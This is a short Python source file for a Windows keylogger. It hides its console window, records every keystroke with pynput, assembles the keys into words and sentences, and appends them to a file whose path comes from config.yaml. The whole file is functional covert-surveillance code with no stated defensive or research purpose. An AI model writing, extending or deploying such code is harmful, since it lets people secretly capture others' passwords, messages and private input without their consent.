from  pynput.keyboard import Key, Listener
import win32console
import win32gui
import logging
from pathlib import Path
from yaml import load, FullLoader
module_name = "key_logger"
sentence = []
word = ""
type_log_output_file = ""

def writekeyLogToFile(sentence):
    with open(type_log_output_file, "a") as f:
        f.write(" ".join(sentence) + ".\n")


def Hide():
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)


def type_logger():
    def on_press(key):
        global word,sentence
        if key == Key.space:
            sentence.append(word)
            word = ""
        elif key == Key.enter or str(key).strip('\'') == ".":
            if len(word) != 0:
                sentence.append(word)
                word =""
            writekeyLogToFile(sentence)
            sentence = []
        else:
            word += str(key).strip('\'')
    def on_release(key):
        if key == Key.esc:
            return False
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
        


def main():
    Hide()
    type_logger()
    
def set_stream_logger(name=module_name, level=logging.DEBUG, format_string=None):
    if format_string is None:
        format_string = "%(asctime)s %(name)s [%(levelname)s] %(message)s"
    logger = logging.getLogger(name)
    logger.setLevel(level)
    handler = logging.StreamHandler()
    handler.setLevel(level)
    formatter = logging.Formatter(format_string)
    handler.setFormatter(formatter)
    logger.addHandler(handler)
        
class NullHandler(logging.Handler):
    def emit(self, record):
        pass

if __name__ == '__main__':
    logging.getLogger(module_name).addHandler(NullHandler())
    log = logging.getLogger(module_name)
    set_stream_logger(name=module_name, level=logging.INFO)
    
    wd = Path.cwd()
    
    with Path(wd, "config.yaml").open(mode="r") as config_file:
        config_data = load(config_file, FullLoader)
        
    type_log_output_file = Path(wd, config_data["outputFiles"]["type_logger"])
    main()